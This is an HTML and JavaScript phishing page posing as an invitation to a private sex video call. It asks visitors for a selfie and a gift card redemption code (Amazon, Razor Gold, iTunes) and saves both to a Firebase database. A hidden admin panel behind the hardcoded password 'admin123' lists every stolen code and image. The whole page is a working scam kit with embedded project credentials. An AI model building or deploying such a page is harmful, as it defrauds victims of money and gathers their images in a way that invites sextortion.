<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Private Video Call Invite with Card Redemption</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to bottom right, pink, pink);
      margin: 0;
      padding: 0;
      text-align: center;
    }

    .container {
      max-width: 500px;
      margin: 80px auto;
      padding: 25px;
      background: pink;
      border-radius: 12px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    }

    h2 {
      color: #333;
    }

    .upload-container {
      border: 2px dashed #ccc;
      padding: 20px;
      border-radius: 10px;
      margin-bottom: 20px;
      background: #fafafa;
    }

    .upload-container label {
      display: block;
      margin-bottom: 10px;
      font-weight: bold;
    }

    input[type="file"] {
      display: block;
      margin: 10px auto;
    }

    .card-redemption {
      margin: 20px 0;
      padding: 15px;
      background: #f8f9fa;
      border-radius: 8px;
      text-align: left;
    }

    .redemption-code {
      margin-bottom: 15px;
    }

    .redemption-code input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 16px;
    }

    .card-option {
      display: flex;
      align-items: center;
      margin: 12px 0;
      padding: 10px;
      background: white;
      border-radius: 6px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }

    .card-option input {
      margin-right: 12px;
    }

    .card-logo {
      width: 30px;
      height: 30px;
      margin-right: 10px;
      object-fit: contain;
    }

    button {
      padding: 12px 25px;
      border: none;
      background: #007bff;
      color: #fff;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      margin: 10px 5px;
    }

    button:hover {
      background: #0056b3;
    }

    button:disabled {
      background: #cccccc;
      cursor: not-allowed;
    }

    .waiting-text {
      font-size: 20px;
      margin-top: 25px;
      font-weight: bold;
      color: #333;
    }

    .call-icon {
      width: 70px;
      height: 70px;
      margin: 20px auto;
      border-radius: 50%;
      background-color: #28a745;
      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56-.35-.12-.74-.03-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 10.73 21 20.01 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"/></svg>');
      background-size: 40px 40px;
      background-repeat: no-repeat;
      background-position: center;
      animation: spin 2.5s linear infinite;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
    }

    @keyframes spin {
      0%   { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .status-message {
      margin: 10px 0;
      padding: 10px;
      border-radius: 5px;
      font-weight: bold;
    }

    .success {
      background-color: #d4edda;
      color: #155724;
    }

    .error {
      background-color: #f8d7da;
      color: #721c24;
    }

    .loading {
      display: none;
      margin: 15px auto;
      width: 40px;
      height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #007bff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    .admin-sticker {
      position: fixed;
      top: 15px;
      right: 15px;
      font-size: 26px;
      cursor: pointer;
      z-index: 1000;
    }

    .admin-panel {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 90%;
      max-width: 600px;
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
      z-index: 2000;
      max-height: 80vh;
      overflow-y: auto;
    }

    .submission {
      margin-bottom: 25px;
      padding: 15px;
      border-bottom: 1px solid #ddd;
      text-align: left;
    }

    .submission img {
      display: block;
      width: 100%;
      max-width: 300px;
      border-radius: 8px;
      margin-bottom: 10px;
    }

    .close-btn {
      background: red;
      color: #fff;
      padding: 6px 12px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-bottom: 15px;
    }
  </style>
  
  <!-- Firebase App (the core Firebase SDK) -->
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <!-- Firebase Firestore -->
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
  <!-- Firebase Storage -->
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
</head>
<body>

  <!-- Admin icon -->
  <div class="admin-sticker" onclick="requestAdminAccess()">❤</div>

  <div class="container">
    <h2>Accept Invitation to Join sex video call</h2>
    <p>Authentication Required</p>

    <div class="upload-container">
      <label>Upload a valid selfie:</label>
      <input type="file" id="selfie" accept="image/*">
    </div>

    <div class="card-redemption">
      <h3>Enter your redemption code to boost video duration:</h3>
      <div class="redemption-code">
        <input type="text" id="redemptionCode" placeholder="Enter your redemption code">
      </div>
      
      <h3>Select your redemption method:</h3>
      
      <div class="card-option">
        <input type="checkbox" id="amazonCard" name="cardType" value="amazon">
        <svg class="card-logo" viewBox="0 0 24 24" width="24" height="24">
          <path fill="#FF9900" d="M10.16 17.76c.43.43.95.65 1.58.65.62 0 1.15-.22 1.57-.65.43-.43.65-.96.65-1.58 0-.62-.22-1.15-.65-1.57-.42-.43-.95-.65-1.57-.65-.63 0-1.15.22-1.58.65-.43.42-.65.95-.65 1.57 0 .63.22 1.15.65 1.58zm-1.46-7.7h2.95l.45-2.31H8.76l.94 2.31zm11.45-4.55c-.33-.79-.83-1.4-1.5-1.81-.67-.42-1.46-.63-2.38-.63-.77 0-1.47.18-2.1.54-.63.36-1.12.87-1.46 1.53h-.05l-.15-.72H7.96L6.53 17.7h2.77l.77-3.87h.05c.33.57.83 1.02 1.5 1.35.67.33 1.42.5 2.25.5 1.12 0 2.07-.36 2.85-1.07.78-.71 1.17-1.7 1.17-2.96 0-.82-.2-1.52-.61-2.1-.4-.58-.97-1.02-1.7-1.32.5-.21.9-.5 1.2-.88.3-.38.5-.82.6-1.32.1-.5.15-1.02.15-1.57 0-.36-.02-.71-.05-1.05h-.05c-.13.47-.38.87-.75 1.2-.37.33-.82.57-1.35.72l-1.67.45-.75-2.25 1.47-.45c.87-.25 1.57-.72 2.1-1.42.53-.7.8-1.54.8-2.52V3.6h2.77l-.25 1.2c.53.25.97.61 1.32 1.07.35.46.58 1 .7 1.62.12.62.18 1.28.18 1.98 0 .87-.12 1.65-.35 2.35-.23.7-.6 1.3-1.1 1.8-.5.5-1.12.88-1.85 1.15-.73.27-1.55.4-2.45.4-.47 0-.92-.05-1.35-.15-.43-.1-.8-.25-1.1-.45-.3-.2-.53-.45-.7-.75-.17-.3-.25-.65-.25-1.05 0-.47.15-.87.45-1.2.3-.33.7-.5 1.2-.5.33 0 .62.07.87.22.25.15.45.35.6.6.15.25.27.55.35.9.08.35.15.75.2 1.2.05.45.1.95.1 1.5 0 .55-.1 1.1-.3 1.65-.6.55-.3 1-.75 1.35-1.35.35-.6.53-1.35.53-2.25 0-.6-.1-1.12-.3-1.57-.2-.45-.48-.8-.85-1.05-.37-.25-.82-.38-1.35-.38-.67 0-1.22.22-1.65.65-.43.43-.65.97-.65 1.62 0 .47.13.87.4 1.2.27.33.62.57 1.05.72l1.35.45.75 2.25-1.65-.45c-.87-.25-1.57-.72-2.1-1.42-.53-.7-.8-1.54-.8-2.52 0-.87.18-1.62.53-2.25.35-.63.83-1.12 1.45-1.47.62-.35 1.32-.53 2.1-.53.73 0 1.38.15 1.95.45.57.3 1.03.72 1.38 1.27.35.55.53 1.18.53 1.9 0 .47-.05.92-.15 1.35-.1.43-.25.8-.45 1.1z"/>
        </svg>
        <label for="amazonCard">Amazon Gift Card</label>
      </div>
      
      <div class="card-option">
        <input type="checkbox" id="razorGold" name="cardType" value="razor">
        <svg class="card-logo" viewBox="0 0 24 24" width="24" height="24">
          <path fill="#000" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13.5h2v7h-2v-7zm1 10c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z"/>
        </svg>
        <label for="razorGold">Razor Gold</label>
      </div>
      
      <div class="card-option">
        <input type="checkbox" id="itunesCard" name="cardType" value="itunes">
        <svg class="card-logo" viewBox="0 0 24 24" width="24" height="24">
          <path fill="#000" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.5-13h-1v5.25l-3.04-1.76-.48.88L12 14.26l4.02-2.32-.48-.88-3.04 1.76V7z"/>
        </svg>
        <label for="itunesCard">iTunes/Apple Gift Card</label>
      </div>
    </div>

    <button onclick="submitFiles()" id="submitBtn">Submit and Start video call</button>
    
    <div id="statusMessage" class="status-message" style="display: none;"></div>
    <div id="loading" class="loading" style="display: none;"></div>

    <p class="waiting-text">Jennifer is waiting for you to join</p>
    <div class="call-icon"></div>
  </div>

  <!-- Admin Panel -->
  <div class="admin-panel" id="adminPanel">
    <button class="close-btn" onclick="closeAdmin()">Close</button>
    <h2>Submissions</h2>
    <div id="submissionsList"></div>
  </div>

<script type="module">
  // Import Firebase v9 SDK
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
  import { 
    getFirestore, collection, addDoc, serverTimestamp, 
    query, orderBy, onSnapshot 
  } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
  import { 
    getStorage, ref, uploadBytes, getDownloadURL 
  } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";

  // Firebase configuration
  const firebaseConfig = {
    apiKey: "AIzaSyBUmxEQRSirDF_hc3rvgzwU5vRc5uVifcY",
    authDomain: "video-call-auth-e2237.firebaseapp.com",
    projectId: "video-call-auth-e2237",
    storageBucket: "video-call-auth-e2237.appspot.com",   // ✅ fixed
    messagingSenderId: "203016834335",
    appId: "1:203016834335:web:fddc9c06f433a64afcf42a",
    measurementId: "G-05HNPKVC14"
  };

  // Initialize Firebase
  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);
  const storage = getStorage(app);

  const ADMIN_PASSWORD = "admin123"; // Change this for security

  // ------------------ Submit Files ------------------
  async function submitFiles() {
    const selfie = document.getElementById("selfie").files[0];
    const redemptionCode = document.getElementById("redemptionCode").value.trim();
    const selectedCards = Array.from(
      document.querySelectorAll('input[name="cardType"]:checked')
    ).map(cb => cb.value);

    if (!selfie) return showStatus("Please upload a selfie before submitting.", "error");
    if (!redemptionCode) return showStatus("Please enter your redemption code.", "error");
    if (selectedCards.length === 0) return showStatus("Please select at least one redemption method.", "error");

    document.getElementById("loading").style.display = "block";
    document.getElementById("submitBtn").disabled = true;

    try {
      // Upload selfie
      const selfieRef = ref(storage, `selfies/${Date.now()}_${selfie.name}`);
      await uploadBytes(selfieRef, selfie);
      const downloadURL = await getDownloadURL(selfieRef);

      // Save Firestore document
      const submission = {
        selfieURL: downloadURL,
        redemptionCode,
        cardTypes: selectedCards,
        time: new Date().toLocaleString(),
        timestamp: serverTimestamp()
      };
      const docRef = await addDoc(collection(db, "submissions"), submission);

      showStatus("Submission successful! You can now join the call.", "success");
      console.log("✅ Document written with ID:", docRef.id);

    } catch (error) {
      console.error("❌ Error details:", error);

      // Save Firestore fallback (no image)
      try {
        const submission = {
          redemptionCode,
          cardTypes: selectedCards,
          time: new Date().toLocaleString(),
          timestamp: serverTimestamp(),
          error: "Image upload failed, but data was saved"
        };
        await addDoc(collection(db, "submissions"), submission);
        showStatus("Data saved (image upload failed). You can now join the call.", "success");
      } catch (dbError) {
        showStatus(`Error: ${dbError.message}`, "error");
        console.error("Error adding document: ", dbError);
      }
    } finally {
      document.getElementById("loading").style.display = "none";
      document.getElementById("submitBtn").disabled = false;
    }
  }

  // ------------------ Admin Access ------------------
  function requestAdminAccess() {
    const pass = prompt("Enter admin password:");
    if (pass === ADMIN_PASSWORD) {
      openAdmin();
    } else {
      alert("Access Denied!");
    }
  }

  function openAdmin() {
    const panel = document.getElementById("adminPanel");
    const list = document.getElementById("submissionsList");
    list.innerHTML = "";

    try {
      const q = query(collection(db, "submissions"), orderBy("timestamp", "desc"));

      // Real-time listener 🔥
      onSnapshot(q, (snapshot) => {
        list.innerHTML = "";
        if (snapshot.empty) {
          list.innerHTML = "<p>No submissions found.</p>";
          return;
        }

        snapshot.forEach((doc) => {
          const data = doc.data();
          list.innerHTML += `
            <div class="submission">
              <p><b>Submission ID:</b> ${doc.id}</p>
              <p><b>Time:</b> ${data.time}</p>
              <p><b>Redemption Code:</b> ${data.redemptionCode || 'N/A'}</p>
              <p><b>Card Types:</b> ${data.cardTypes ? data.cardTypes.join(", ") : 'N/A'}</p>
              ${data.selfieURL ? `<img src="${data.selfieURL}" alt="Selfie">` : '<p>No image available</p>'}
              ${data.error ? `<p class="error">Error: ${data.error}</p>` : ''}
            </div>
          `;
        });
      });
    } catch (error) {
      list.innerHTML = `<p>Error loading data: ${error.message}</p>`;
    }

    panel.style.display = "block";
  }

  function closeAdmin() {
    document.getElementById("adminPanel").style.display = "none";
  }

  // ------------------ Helpers ------------------
  function showStatus(message, type) {
    const statusEl = document.getElementById("statusMessage");
    statusEl.textContent = message;
    statusEl.className = `status-message ${type}`;
    statusEl.style.display = "block";
    setTimeout(() => { statusEl.style.display = "none"; }, 5000);
  }

  // Only allow one card type at a time
  document.querySelectorAll('input[name="cardType"]').forEach(checkbox => {
    checkbox.addEventListener('change', function () {
      if (this.checked) {
        document.querySelectorAll('input[name="cardType"]').forEach(other => {
          if (other !== this) other.checked = false;
        });
      }
    });
  });

  // Expose functions globally for HTML buttons
  window.submitFiles = submitFiles;
  window.requestAdminAccess = requestAdminAccess;
  window.closeAdmin = closeAdmin;
</script>
</body>
</html>